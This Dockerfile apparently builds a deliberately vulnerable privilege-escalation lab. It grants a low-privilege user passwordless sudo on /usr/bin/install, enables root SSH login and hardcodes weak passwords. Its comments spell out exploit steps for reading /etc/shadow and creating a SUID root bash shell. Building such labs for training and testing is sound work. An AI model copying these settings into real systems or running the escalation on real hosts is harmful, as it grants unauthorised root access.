FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_install
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/install as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and coreutils (which provides /usr/bin/install)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify install is available
RUN which install && ls -la /usr/bin/install

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# The `install` command can copy files and set permissions/ownership.
# GTFOBins exploit approach:
#   LFILE=/etc/shadow
#   TF=$(mktemp)
#   sudo install -m 0666 $LFILE $TF  (read arbitrary files)
# Or to get a root shell:
#   sudo install -m =xs $(which bash) /tmp/bash
#   /tmp/bash -p
# This copies bash with SUID root, granting full root access.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/install" > /etc/sudoers.d/install && \
    chmod 440 /etc/sudoers.d/install

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]